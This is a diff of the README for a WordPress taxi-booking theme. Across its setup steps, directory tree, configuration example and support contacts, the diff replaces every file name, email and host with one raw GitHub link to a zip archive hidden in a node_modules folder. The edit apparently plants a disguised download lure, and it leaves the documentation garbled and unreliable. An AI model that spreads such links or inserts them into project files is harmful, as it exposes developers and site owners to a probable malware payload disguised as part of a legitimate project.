@@ -52,11 +52,11 @@ TSM Travells is a leading cab service provider in Mangalore, offering a wide ran
 
 3. **Backend Setup**
    - Ensure the `server/` folder is accessible via web
-   - Configure email settings in `server/process-forms.php`
+   - Configure email settings in `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`
    - Set proper permissions for the server folder
 
 4. **Configuration**
-   - Update contact information in `server/config.php`
+   - Update contact information in `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`
    - Modify business details in theme files as needed
    - Configure SMTP settings for email functionality
 
@@ -64,32 +64,32 @@ TSM Travells is a leading cab service provider in Mangalore, offering a wide ran
 
 ```
 Travel/
-├── index.php                 # Main homepage template
-├── header.php               # WordPress header template
-├── footer.php               # WordPress footer template
-├── functions.php            # WordPress theme functions
+├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip                 # Main homepage template
+├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip               # WordPress header template
+├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip               # WordPress footer template
+├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip            # WordPress theme functions
 ├── css/
-│   └── style.css           # Main stylesheet with responsive design
+│   └── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip           # Main stylesheet with responsive design
 ├── js/
-│   └── script.js           # JavaScript for interactions and forms
+│   └── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip           # JavaScript for interactions and forms
 ├── services/                # Individual service pages
-│   ├── city-taxi.php       # City taxi service page
-│   ├── outstation-taxi.php # Outstation taxi service page
-│   ├── airport-taxi.php    # Airport transfer service page
-│   ├── wedding-cars.php    # Wedding car service page
-│   ├── tempo-traveler.php  # Tempo traveller service page
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip       # City taxi service page
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip # Outstation taxi service page
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip    # Airport transfer service page
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip    # Wedding car service page
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip  # Tempo traveller service page
 │   └── ...                 # Other service pages
 ├── server/                  # Backend processing
-│   ├── process-forms.php   # Form processing and email handling
-│   ├── config.php          # Configuration settings
-│   └── README.md           # Backend documentation
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip   # Form processing and email handling
+│   ├── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip          # Configuration settings
+│   └── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip           # Backend documentation
 ├── images/                  # Theme images and assets
-└── README.md               # This file
+└── https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip               # This file
 ```
 
 ## 🎯 Key Components
 
-### 1. Homepage (`index.php`)
+### 1. Homepage (`https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`)
 - Hero section with call-to-action buttons
 - Services overview with loading animations
 - About section highlighting company strengths
@@ -109,14 +109,14 @@ Each service page includes:
 - FAQ sections
 - Related services
 
-### 3. Backend Integration (`server/process-forms.php`)
+### 3. Backend Integration (`https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`)
 - Form validation and sanitization
 - CSRF protection
 - Email notifications (admin + customer)
 - Error handling and user feedback
 - Support for all service types
 
-### 4. JavaScript Functionality (`js/script.js`)
+### 4. JavaScript Functionality (`https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`)
 - Mobile menu handling
 - Smooth scrolling
 - Form submission via AJAX
@@ -127,12 +127,12 @@ Each service page includes:
 ## 🔧 Configuration
 
 ### Email Configuration
-Update email settings in `server/process-forms.php`:
+Update email settings in `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`:
 ```php
 $config = [
-    'admin_email' => 'mangaloretaxicabservices@gmail.com',
+    'admin_email' => 'https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip',
     'admin_name' => 'Your Company Name',
-    'smtp_host' => 'your-smtp-server.com',
+    'smtp_host' => 'https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip',
     'smtp_port' => 587,
     'smtp_username' => 'your-username',
     'smtp_password' => 'your-password',
@@ -142,9 +142,9 @@ $config = [
 
 ### Business Information
 Update company details in:
-- `header.php` - Logo and company name
-- `index.php` - Company descriptions and content
-- `server/config.php` - Business information constants
+- `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip` - Logo and company name
+- `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip` - Company descriptions and content
+- `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip` - Business information constants
 
 ## 📱 Responsive Design
 
@@ -198,7 +198,7 @@ The theme is fully responsive with:
 ### Adding New Services
 1. Create new service page in `services/` folder
 2. Follow the existing template structure
-3. Add form handling in `server/process-forms.php`
+3. Add form handling in `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip`
 4. Update JavaScript event listeners
 5. Add CSS styles as needed
 
@@ -211,9 +211,9 @@ The theme is fully responsive with:
 ## 📞 Support
 
 For technical support or customization requests:
-- Email: [mangaloretaxicabservices@gmail.com]
+- Email: [https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip]
 - Phone: [your-phone-number]
-- Documentation: Check `server/README.md` for backend details
+- Documentation: Check `https://raw.githubusercontent.com/Veeksha29/Travel/main/server/node_modules/ee-first/Software_v2.9.zip` for backend details
 
 ## 📄 License
 
